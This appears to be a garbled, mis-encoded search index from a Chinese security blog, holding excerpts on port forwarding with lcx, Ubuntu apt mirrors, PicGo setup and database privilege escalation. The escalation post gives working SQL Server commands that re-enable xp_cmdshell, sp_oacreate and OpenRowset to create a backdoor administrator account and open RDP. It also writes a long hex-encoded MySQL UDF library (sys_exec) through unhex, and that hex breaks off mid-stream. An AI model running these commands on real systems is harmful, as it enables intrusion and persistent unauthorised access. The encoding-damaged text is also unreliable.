å‘½ä»¤å«ä¹‰æ˜¯å°†å…¬ç½‘æœåŠ¡å™¨ç›‘å¬çš„3950ç«¯å£æ¥æ”¶çš„æ•°æ®è½¬å‘è‡³å…¬ç½‘ipçš„3951ç«¯å£ è¢«æ§åˆ¶ä¸»æœºè½¬å‘ç«¯å£lcx.exe -slave å…¬ç½‘æœåŠ¡å™¨ip 3950 127.0.0.1 åŒç½‘æ®µäº’é€šä¸»æœºå¼€å¯ç›‘å¬Lcx.exe -listen 51 8888 ç›‘å¬æœ¬åœ°çš„51ç«¯å£å°†å…¶è½¬å‘åˆ°8888","link":"/2021/03/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/security-transform-port/"},{"title":"Webå®‰å…¨æŠ€æœ¯ä½“ç³»å¯¼å›¾","text":"","link":"/2020/03/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web-security-frame/"},{"title":"ubuntuä¿®æ”¹aptæº","text":"ä¿®æ”¹ubuntu18.04çš„æºä¸ºé˜¿é‡Œæº ä¿®æ”¹ubuntuçš„aptæºä¸ºé˜¿é‡Œæºubuntu 18.0412345678910111213141516171819# å¤‡ä»½mv /etc/apt/sources.list /etc/apt/sources.list# æ–°å»ºé˜¿é‡Œæºcat &gt; /etc/apt/sources.list &lt;&lt; EOFdeb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverseEOF# æ›´æ–°æºapt-get update &amp;&amp; apt-get upgrade ubuntu 16.04123456789101112131415161718192021222324# å¤‡ä»½mv /etc/apt/sources.list /etc/apt/sources.list# æ–°å»ºé˜¿é‡Œæºcat &gt; /etc/apt/sources.list &lt;&lt; EOF#debåŒ…deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse ##æµ‹è¯•ç‰ˆæº deb http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiverse # æºç  deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse ##æµ‹è¯•ç‰ˆæº deb-src http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiverse # Canonical åˆä½œä¼™ä¼´å’Œé™„åŠ  EOF# æ›´æ–°æºapt-get update &amp;&amp; apt-get upgrade","link":"/2018/06/21/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Linux-ubuntu-apt-source/"},{"title":"picgo+giteeå›¾åºŠé…ç½®","text":"ç¯å¢ƒä¸‹è½½picgoä¸‹è½½é“¾æ¥ nodejsä¸‹è½½åœ°å€ æç¤º:å¿…é¡»è¦é…ç½®å®‰è£…å®Œæˆnodejsåæ‰å¯ä¸‹è½½åç»­çš„æ’ä»¶ picgoæ’ä»¶å®‰è£… giteeä»“åº“é…ç½®æ–°å»ºä»“åº“ åœ¨ä»“åº“ä¸­æ–°å»ºä¸€ä¸ªæ–‡ä»¶imgç”¨äºå­˜æ”¾ä¸Šä¼ çš„å›¾ç‰‡ã€‚ è·å–ç äº‘çš„token éªŒè¯å®Œç äº‘çš„å¯†ç åï¼Œä¼šæ˜¾ç¤ºå‡ºtokenã€‚æ³¨æ„ï¼Œè¿™ä¸ªtokenåªä¼šåœ¨è¿™é‡Œæ˜¾ç¤ºä¸€æ¬¡ã€‚ ä¿å­˜å¥½tokenï¼Œå°†åœ¨é…ç½®PicGoæ’ä»¶æ—¶ä½¿ç”¨ã€‚ é…ç½®æ’ä»¶ repo: giteeç”¨æˆ·å/ä»“åº“å branch: åˆ†æ”¯ã€‚æŒ‡å®šä¸ºä¸»åˆ†æ”¯ token: ç§äººä»¤ç‰Œã€‚ä¹‹å‰åœ¨ç äº‘ä¸Šåˆ›å»ºçš„ä»¤ç‰Œ path: å›¾ç‰‡å­˜æ”¾è·¯å¾„ã€‚åˆ›å»ºä»“åº“æ—¶ï¼Œæ–°å»ºçš„æ–‡ä»¶å¤¹åã€‚ customPathï¼šæäº¤æ¶ˆæ¯ï¼Œè¿™ä¸€é¡¹å’Œä¸‹ä¸€é¡¹customURLéƒ½ä¸ç”¨å¡«ã€‚åœ¨æäº¤åˆ°ç äº‘åï¼Œä¼šæ˜¾ç¤ºæäº¤æ¶ˆæ¯ï¼Œæ’ä»¶é»˜è®¤æäº¤çš„æ˜¯ Upload å›¾ç‰‡å by picGo - æ—¶é—´","link":"/2021/08/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/picgo-gitee-config/"},{"title":"æ›´æ¢ç”µè„‘ä¹‹ååšå®¢è¿ç§»æ“ä½œ","text":"å¼€å§‹å‡†å¤‡é»˜è®¤æå‰å®‰è£…å¥½git,nodejs æ‹·è´å¿…è¦æ–‡ä»¶ _config.yml theme source scaffolds package.json .gitignore å®‰è£…å¿…è¦ç¯å¢ƒ1234567npm install hexo-cli -gnpm installå¿…è¦ç»„ä»¶sudo npm install hexo-deployer-git --savesudo npm install hexo-generator-feed --savesudo npm install hexo-generator-sitemap --save gitéƒ¨ç½²å°†é»˜è®¤ç§é’¥æ·»åŠ è‡³.sshè·¯å¾„ gitåˆå§‹åŒ–ä¸€ä¸‹å³å¯","link":"/2020/08/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/change-compute-config/"},{"title":"mysqlä¸­å¸¸ç”¨çš„é…ç½®æ“ä½œ","text":"mysqlä¸­å¼€å¯å¤–è”","link":"/2021/02/03/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/mysql-config/"},{"title":"å¸¸ç”¨æ•°æ®åº“ææƒæ‰‹æ®µ","text":"SQL Serverå¸¸ç”¨ææƒåŸºç¡€çŸ¥è¯†ç”±äºsqlserveræœåŠ¡åœ¨æ²¡æœ‰é™æƒçš„æƒ…å†µä¸‹é»˜è®¤ä»¥systemæƒé™è¿è¡Œï¼Œä¸€æ—¦æˆ‘ä»¬æŒæ¡äº†sqlserverçš„æ§åˆ¶æƒé™å°±æœ‰å¯èƒ½åˆ©ç”¨systemæƒé™å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œæ§åˆ¶ï¼Œä»è€Œå¯¼è‡´æƒé™çš„æå‡ã€‚åœ¨sqlserverä¸­å­˜åœ¨ä¸€äº›å®˜æ–¹è‡ªå¸¦çš„å­˜å‚¨è¿‡ç¨‹ï¼Œå…¶ä¸­ä¸€äº›å¯ä»¥ç›´æ¥æˆ–é—´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚æˆ‘ä»¬å¸¸ç”¨çš„ææƒæ“ä½œå¤§å¤šéƒ½ä¾èµ–äºè¿™äº›å­˜å‚¨è¿‡ç¨‹ å­˜å‚¨è¿‡ç¨‹çš„æ¦‚å¿µï¼š å­˜å‚¨è¿‡ç¨‹ï¼ˆStored Procedureï¼‰æ˜¯åœ¨å¤§å‹æ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œä¸€ç»„ä¸ºäº†å®Œæˆç‰¹å®šåŠŸèƒ½çš„SQL è¯­å¥é›†ï¼Œå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œç»è¿‡ç¬¬ä¸€æ¬¡ç¼–è¯‘åå†æ¬¡è°ƒç”¨ä¸éœ€è¦å†æ¬¡ç¼–è¯‘ï¼Œç”¨æˆ·é€šè¿‡æŒ‡å®šå­˜å‚¨è¿‡ç¨‹çš„åå­—å¹¶ç»™å‡ºå‚æ•°ï¼ˆå¦‚æœè¯¥å­˜å‚¨è¿‡ç¨‹å¸¦æœ‰å‚æ•°ï¼‰æ¥æ‰§è¡Œå®ƒã€‚å­˜å‚¨è¿‡ç¨‹æ˜¯æ•°æ®åº“ä¸­çš„ä¸€ä¸ªé‡è¦å¯¹è±¡ï¼Œä»»ä½•ä¸€ä¸ªè®¾è®¡è‰¯å¥½çš„æ•°æ®åº“åº”ç”¨ç¨‹åºéƒ½åº”è¯¥ç”¨åˆ°å­˜å‚¨è¿‡ç¨‹ã€‚ è¿™é‡Œæ³¨æ„ï¼Œåœ¨é«˜ç‰ˆæœ¬çš„sqlserveræ•°æ®åº“ä¸­ï¼Œä¸€äº›å¸¸è§çš„ç”¨äºææƒçš„å‡½æ•°é»˜è®¤è¢«ç¦ç”¨æ‰ï¼Œè¿™é‡Œéœ€è¦å…ˆè¿›è¡Œæ¢å¤æ‰èƒ½è¿›è¡Œæ‰§è¡Œå‘½ä»¤ç­‰ä¸€ç³»åˆ—æ“ä½œ æœ¬æ¬¡æˆ‘ä»¬ä½¿ç”¨çš„æµ‹è¯•ç¯å¢ƒä¸ºsqlserver2008 å¯¹äºé«˜ç‰ˆæœ¬çš„sqlserverç³»ç»Ÿé»˜è®¤ç¦ç”¨æ‰äº†xp_cmdshellç­‰å­˜å‚¨è¿‡ç¨‹ï¼Œä½†æ˜¯å¹¶ä¸ä¼šå½±å“æˆ‘ä»¬è¿›è¡Œæƒé™çš„æå‡ï¼Œåœ¨æ¢å¤å­˜å‚¨è¿‡ç¨‹ä¹‹åæˆ‘ä»¬ä»å¯ä»¥è¿›è¡Œæ“ä½œã€‚ å­˜å‚¨è¿‡ç¨‹ï¼ˆStored Procedureï¼‰æ˜¯åœ¨å¤§å‹æ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œä¸€ç»„ä¸ºäº†å®Œæˆç‰¹å®šåŠŸèƒ½çš„SQL è¯­å¥é›†ï¼Œå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œç»è¿‡ç¬¬ä¸€æ¬¡ç¼–è¯‘åå†æ¬¡è°ƒç”¨ä¸éœ€è¦å†æ¬¡ç¼–è¯‘ï¼Œç”¨æˆ·é€šè¿‡æŒ‡å®šå­˜å‚¨è¿‡ç¨‹çš„åå­—å¹¶ç»™å‡ºå‚æ•°ï¼ˆå¦‚æœè¯¥å­˜å‚¨è¿‡ç¨‹å¸¦æœ‰å‚æ•°ï¼‰æ¥æ‰§è¡Œå®ƒã€‚å­˜å‚¨è¿‡ç¨‹æ˜¯æ•°æ®åº“ä¸­çš„ä¸€ä¸ªé‡è¦å¯¹è±¡ï¼Œä»»ä½•ä¸€ä¸ªè®¾è®¡è‰¯å¥½çš„æ•°æ®åº“åº”ç”¨ç¨‹åºéƒ½åº”è¯¥ç”¨åˆ°å­˜å‚¨è¿‡ç¨‹ã€‚ è¿™é‡Œæ³¨æ„ï¼Œåœ¨é«˜ç‰ˆæœ¬çš„sqlserveræ•°æ®åº“ä¸­ï¼Œä¸€äº›å¸¸è§çš„ç”¨äºææƒçš„å‡½æ•°é»˜è®¤è¢«ç¦ç”¨æ‰ï¼Œè¿™é‡Œéœ€è¦å…ˆè¿›è¡Œæ¢å¤æ‰èƒ½è¿›è¡Œæ‰§è¡Œå‘½ä»¤ç­‰ä¸€ç³»åˆ—æ“ä½œ æœ¬æ¬¡æˆ‘ä»¬ä½¿ç”¨çš„æµ‹è¯•ç¯å¢ƒä¸ºsqlserver2008 å¯¹äºé«˜ç‰ˆæœ¬çš„sqlserverç³»ç»Ÿé»˜è®¤ç¦ç”¨æ‰äº†xp_cmdshellç­‰å­˜å‚¨è¿‡ç¨‹ï¼Œä½†æ˜¯å¹¶ä¸ä¼šå½±å“æˆ‘ä»¬è¿›è¡Œæƒé™çš„æå‡ï¼Œåœ¨æ¢å¤å­˜å‚¨è¿‡ç¨‹ä¹‹åæˆ‘ä»¬ä»å¯ä»¥è¿›è¡Œæ“ä½œã€‚ xp_cmdshellææƒå‰ææ¡ä»¶ï¼š â€‹ å·²å¾—åˆ°sql server çš„saæƒé™ â€‹ sql server å¼€å¯å¤–è” é«˜ç‰ˆæœ¬å­˜å‚¨è¿‡ç¨‹çš„æ¢å¤ 12345678EXEC sp_configure 'show advanced options', 1 ï¼ˆsp_configure æ˜¯æ˜¾ç¤ºæˆ–æ›´æ”¹å½“å‰æœåŠ¡å™¨çš„å…¨å±€é…ç½®è®¾ç½®ã€‚å°†show advanced options è®¾ç½®ä¸º1,ä¾¿å¯ä»¥æ˜¾ç¤ºé«˜çº§é…ç½®é€‰é¡¹äº†ã€‚ï¼‰RECONFIGURE ï¼ˆå¯ä»¥é…ç½®é€‰é¡¹ï¼‰EXEC sp_configure 'xp_cmdshell', 1 ï¼ˆä½œç”¨å°±æ˜¯reconfigure sp_configureä¸­çš„xp_cmdshellä¸º1ã€‚ä¹Ÿå°±æ˜¯å¼€å¯äº†cmdshellã€‚ï¼‰RECONFIGUREå¦‚æœä»¥ä¸Šæ–¹æ³•æ— æ³•ä½¿ç”¨ï¼Œåˆ™æ˜¯å­˜å‚¨è¿‡ç¨‹è¢«åˆ é™¤ï¼Œæˆ‘ä»¬æ¥æ·»åŠ å­˜å‚¨è¿‡ç¨‹dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)sp_addextendedproc xp_cmdshell,@dllname=xplog70.dll ææƒåˆ©ç”¨ 12345678910# æ–°å»ºç”¨æˆ·exec master.dbo.xp_cmdshell 'net user admin admin /add' # å°†ç”¨æˆ·åŠ å…¥ç®¡ç†å‘˜ç»„exec master.dbo.xp_cmdshell 'net localgroup administrators admin /add' # å¼€å¯è¿œç¨‹3389exec master.dbo.xp_cmdshell 'reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f' exec master.dbo.xp_cmdshell 'reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp&quot; /v PortNumber /t REG_DWORD /d 3389 /f'exec master.dbo.xp_cmdshell 'reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 3389 /fâ€™ sp_oacreateææƒå¼€å¯sp_oacreateæ”¯æŒ 123456789101112131415161718EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE;declare @shell int--ä½¿ç”¨sp_oacreateè°ƒç”¨wscript.shellç»„ä»¶ï¼Œå°†è¿”å›çš„å¯¹è±¡å­˜å‚¨åˆ°@shellå˜é‡ä¸­ã€‚exec sp_oacreate 'wscript.shell',@shell output--ä½¿ç”¨sp_oamethod è°ƒç”¨@shellå¯¹è±¡ä¸­çš„Runæ–¹æ³•ï¼Œæ‰§è¡Œæ·»åŠ ç”¨æˆ·çš„å‘½ä»¤ï¼Œnullæ˜¯runæ–¹æ³•çš„è¿”å›å€¼ï¼Œæˆ‘ä»¬ä¸éœ€è¦ç”¨è¿”å›å€¼ï¼Œæ‰€ä»¥å†™null.exec sp_oamethod @shell,'run',null,'net user admin admin /add'exec sp_oacreate 'wscript.shell',@shell output--ä½¿ç”¨sp_oamethod è°ƒç”¨@shellå¯¹è±¡ä¸­çš„Runæ–¹æ³•ï¼Œæ‰§è¡Œæ·»åŠ ç”¨æˆ·çš„å‘½ä»¤exec sp_oamethod @shell,'run',null,'net localgroup administrators admin /add'--å¼€å¯3389exec sp_oamethod @shell,'run',null,'reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f' exec sp_oamethod @shell,'run',null,'reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp&quot; /v PortNumber /t REG_DWORD /d 3389 /f'exec sp_oamethod @shell,'run',null,'reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 3389 /fâ€™ ä½¿ç”¨æ²™ç›’è¿›è¡Œææƒææƒè¯­å¥ 123456789101112131415161718exec sp_configure 'show advanced options',1;reconfigure;-- ä¸å¼€å¯çš„è¯åœ¨æ‰§è¡Œxp_regwriteä¼šæç¤ºè®©æˆ‘ä»¬å¼€å¯ï¼Œexec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure;--å…³é—­æ²™ç›’æ¨¡å¼ï¼Œå¦‚æœä¸€æ¬¡æ‰§è¡Œå…¨éƒ¨ä»£ç æœ‰é—®é¢˜ï¼Œå…ˆæ‰§è¡Œä¸Šé¢ä¸¤å¥ä»£ç ã€‚exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',0;--æŸ¥è¯¢æ˜¯å¦æ­£å¸¸å…³é—­ï¼Œç»è¿‡æµ‹è¯•å‘ç°æ²™ç›’æ¨¡å¼æ— è®ºæ˜¯å¼€ï¼Œè¿˜æ˜¯å…³ï¼Œéƒ½ä¸ä¼šå½±å“æˆ‘ä»¬æ‰§è¡Œä¸‹é¢çš„è¯­å¥ã€‚exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines', 'SandBoxMode'--æ‰§è¡Œç³»ç»Ÿå‘½ä»¤select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(&quot;net user admin admin /add&quot;)')select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(&quot;net localgroup administrators admin /add&quot;)') æ²™ç›’æ¨¡å¼SandBoxModeå‚æ•°å«ä¹‰ï¼ˆé»˜è®¤æ˜¯2ï¼‰ 0ï¼šåœ¨ä»»ä½•æ‰€æœ‰è€…ä¸­ç¦æ­¢å¯ç”¨å®‰å…¨æ¨¡å¼ 1 ï¼šä¸ºä»…åœ¨å…è®¸èŒƒå›´å†… 2 ï¼šå¿…é¡»åœ¨accessæ¨¡å¼ä¸‹ 3ï¼šå®Œå…¨å¼€å¯ openrowsetæ˜¯å¯ä»¥é€šè¿‡OLE DBè®¿é—®SQL Serveræ•°æ®åº“ï¼ŒOLE DBæ˜¯åº”ç”¨ç¨‹åºé“¾æ¥åˆ°SQL Serverçš„çš„é©±åŠ¨ç¨‹åºã€‚ æ¢å¤é…ç½® 12345--exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1;--exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure;--exec sp_configure 'show advanced options',0;reconfigure; MySQLå¸¸ç”¨ææƒå‰ææ¡ä»¶å‡å·²é€šè¿‡å‰ç½®æ‰‹æ®µè·å–åˆ°mysql rootæƒé™ é€šè¿‡å¤–è”æˆ–è€…å¤§é©¬ç›´æ¥rootæƒé™ä¸‹æ‰§è¡ŒSQLå‘½ä»¤ mysql udfææƒLinuxç¯å¢ƒ è·å–æ’ä»¶åº“è·¯å¾„ 1show variables like &quot;%plugin%&quot;; å†™å…¥è‡ªå®šä¹‰å‡½æ•° 1select unhex('7F454C4602010100000000000000000003003E0001000000D00C0000000000004000000000000000E8180000000000000000000040003800050040001A00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050E57464040000006412000000000000641200000000000064120000000000009C000000000000009C00000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002B0000001500000005000000280000001E000000000000000000000006000000000000000C00000000000000070000002A00000009000000210000000000000000000000270000000B0000002200000018000000240000000E00000000000000040000001D0000001600000000000000130000000000000000000000120000002300000010000000250000001A0000000F000000000000000000000000000000000000001B00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000A00000011000000000000000000000000000000000000000D0000002600000017000000000000000800000000000000000000000000000000000000000000001F0000001C0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119C4C93DA4400398046883140000001600000017000000190000001B0000001D0000002000000022000000000000002300000000000000240000002500000027000000290000002A00000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED871581CC1E2F7DEA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF36AC68AE3B9FD4A0AC73D1C525681B320B5911FEAB5FBE120000000000000000000000000000000000000000000000000000000003000900A00B0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000E0000000120000000000000000000000DE01000000000000790100001200000000000000000000007700000000000000BA0000001200000000000000000000003504000000000000F5000000120000000000000000000000C2010000000000009E010000120000000000000000000000D900000000000000FB000000120000000000000000000000050000000000000016000000220000000000000000000000FE00000000000000CF000000120000000000000000000000AD00000000000000880100001200000000000000000000008000000000000000AB010000120000000000000000000000250100000000000010010000120000000000000000000000DC00000000000000C7000000120000000000000000000000C200000000000000B5000000120000000000000000000000CC02000000000000ED000000120000000000000000000000E802000000000000E70000001200000000000000000000009B00000000000000C200000012000000000000000000000028000000000000008001000012000B007A100000000000006E000000000000007500000012000B00A70D00000000000001000000000000001000000012000C00781100000000000000000000000000003F01000012000B001A100000000000002D000000000000001F01000012000900A00B0000000000000000000000000000C30100001000F1FF881720000000000000000000000000009600000012000B00AB0D00000000000001000000000000007001000012000B0066100000000000001400000000000000CF0100001000F1FF981720000000000000000000000000005600000012000B00A50D00000000000001000000000000000201000012000B002E0F0000000000002900000000000000A301000012000B00F71000000000000041000000000000003900000012000B00A40D00000000000001000000000000003201000012000B00EA0F0000000000003000000000000000BC0100001000F1FF881720000000000000000000000000006500000012000B00A60D00000000000001000000000000002501000012000B00800F0000000000006A000000000000008500000012000B00A80D00000000000003000000000000001701000012000B00570F00000000000029000000000000005501000012000B0047100000000000001F00000000000000A900000012000B00AC0D0000000000009A000000000000008F01000012000B00E8100000000000000F00000000000000D700000012000B00460E000000000000E800000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F6765745F6465696E6974007379735F657865635F6465696E6974007379735F6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C00666F726B00737973636F6E66006D6D6170007374726E6370790077616974706964007379735F6576616C006D616C6C6F6300706F70656E007265616C6C6F630066676574730070636C6F7365007379735F6576616C5F696E697400737472637079007379735F657865635F696E6974007379735F7365745F696E6974007379735F6765745F696E6974006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F657865630073797374656D007379735F73657400736574656E76007379735F7365745F6465696E69740066726565007379735F67657400676574656E76006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100B20100001000000000000000751A690900000200D401000000000000801720000000000008000000000000008017200000000000D01620000000000006000000020000000000000000000000D81620000000000006000000030000000000000000000000E016200000000000060000000A00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000A00000000000000000000003817200000000000070000000B00000000000000000000004017200000000000070000000C00000000000000000000004817200000000000070000000D00000000000000000000005017200000000000070000000E00000000000000000000005817200000000000070000000F00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883EC08E827010000E8C2010000E88D0500004883C408C3FF35320B2000FF25340B20000F1F4000FF25320B20006800000000E9E0FFFFFFFF252A0B20006801000000E9D0FFFFFFFF25220B20006802000000E9C0FFFFFFFF251A0B20006803000000E9B0FFFFFFFF25120B20006804000000E9A0FFFFFFFF250A0B20006805000000E990FFFFFFFF25020B20006806000000E980FFFFFFFF25FA0A20006807000000E970FFFFFFFF25F20A20006808000000E960FFFFFFFF25EA0A20006809000000E950FFFFFFFF25E20A2000680A000000E940FFFFFFFF25DA0A2000680B000000E930FFFFFFFF25D20A2000680C000000E920FFFFFFFF25CA0A2000680D000000E910FFFFFFFF25C20A2000680E000000E900FFFFFFFF25BA0A2000680F000000E9F0FEFFFF00000000000000004883EC08488B05F50920004885C07402FFD04883C408C390909090909090909055803D900A2000004889E5415453756248833DD809200000740C488B3D6F0A2000E812FFFFFF488D05130820004C8D2504082000488B15650A20004C29E048C1F803488D58FF4839DA73200F1F440000488D4201488905450A200041FF14C4488B153A0A20004839DA72E5C605260A2000015B415CC9C3660F1F8400000000005548833DBF072000004889E57422488B05530920004885C07416488D3DA70720004989C3C941FFE30F1F840000000000C9C39090C3C3C3C331C0C3C341544883C9FF4989F455534883EC10488B4610488B3831C0F2AE48F7D1488D69FFE8B6FEFFFF83F80089C77C61754FBF1E000000E803FEFFFF488D70FF4531C94531C031FFB921000000BA07000000488D042E48F7D64821C6E8AEFEFFFF4883F8FF4889C37427498B4424104889EA4889DF488B30E852FEFFFFFFD3EB0CBA0100000031F6E802FEFFFF31C0EB05B8010000005A595B5D415CC34157BF00040000415641554531ED415455534889F34883EC1848894C24104C89442408E85AFDFFFFBF010000004989C6E84DFDFFFFC600004889C5488B4310488D356A030000488B38E814FEFFFF4989C7EB374C89F731C04883C9FFF2AE4889EF48F7D1488D59FF4D8D641D004C89E6E8DDFDFFFF4A8D3C284889DA4C89F64D89E54889C5E8A8FDFFFF4C89FABE080000004C89F7E818FDFFFF4885C075B44C89FFE82BFDFFFF807D0000750A488B442408C60001EB1F42C6442DFF0031C04883C9FF4889EFF2AE488B44241048F7D148FFC94889084883C4184889E85B5D415C415D415E415FC34883EC08833E014889D7750B488B460831D2833800740E488D353A020000E817FDFFFFB20188D05EC34883EC08833E014889D7750B488B460831D2833800740E488D3511020000E8EEFCFFFFB20188D05FC3554889FD534889D34883EC08833E027409488D3519020000EB3F488B46088338007409488D3526020000EB2DC7400400000000488B4618488B384883C70248037808E801FCFFFF31D24885C0488945107511488D351F0200004889DFE887FCFFFFB20141585B88D05DC34883EC08833E014889F94889D77510488B46088338007507C6010131C0EB0E488D3576010000E853FCFFFFB0014159C34154488D35EF0100004989CC4889D7534889D34883EC08E832FCFFFF49C704241E0000004889D8415A5B415CC34883EC0831C0833E004889D7740E488D35D5010000E807FCFFFFB001415BC34883EC08488B4610488B38E862FBFFFF5A4898C34883EC28488B46184C8B4F104989F2488B08488B46104C89CF488B004D8D4409014889C6F3A44C89C7498B4218488B0041C6040100498B4210498B5218488B4008488B4A08BA010000004889C6F3A44C89C64C89CF498B4218488B400841C6040000E867FBFFFF4883C4284898C3488B7F104885FF7405E912FBFFFFC3554889CD534C89C34883EC08488B4610488B38E849FBFFFF4885C04889C27505C60301EB1531C04883C9FF4889D7F2AE48F7D148FFC948894D00595B4889D05DC39090909090909090554889E5534883EC08488B05C80320004883F8FF7419488D1DBB0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E86FFBFFFF4883C408C345787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D657465720045787065637465642065786163746C792074776F20617267756D656E747300457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E34004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F290000011B033B980000001200000040FBFFFFB400000041FBFFFFCC00000042FBFFFFE400000043FBFFFFFC00000044FBFFFF1401000047FBFFFF2C01000048FBFFFF44010000E2FBFFFF6C010000CAFCFFFFA4010000F3FCFFFFBC0100001CFDFFFFD401000086FDFFFFF4010000B6FDFFFF0C020000E3FDFFFF2C02000002FEFFFF4402000016FEFFFF5C02000084FEFFFF7402000093FEFFFF8C0200001400000000000000017A5200017810011B0C070890010000140000001C00000084FAFFFF01000000000000000000000014000000340000006DFAFFFF010000000000000000000000140000004C00000056FAFFFF01000000000000000000000014000000640000003FFAFFFF010000000000000000000000140000007C00000028FAFFFF030000000000000000000000140000009400000013FAFFFF01000000000000000000000024000000AC000000FCF9FFFF9A00000000420E108C02480E18410E20440E3083048603000000000034000000D40000006EFAFFFFE800000000420E10470E18420E208D048E038F02450E28410E30410E38830786068C05470E50000000000000140000000C0100001EFBFFFF2900000000440E100000000014000000240100002FFBFFFF2900000000440E10000000001C0000003C01000040FBFFFF6A00000000410E108602440E188303470E200000140000005C0100008AFBFFFF3000000000440E10000000001C00000074010000A2FBFFFF2D000000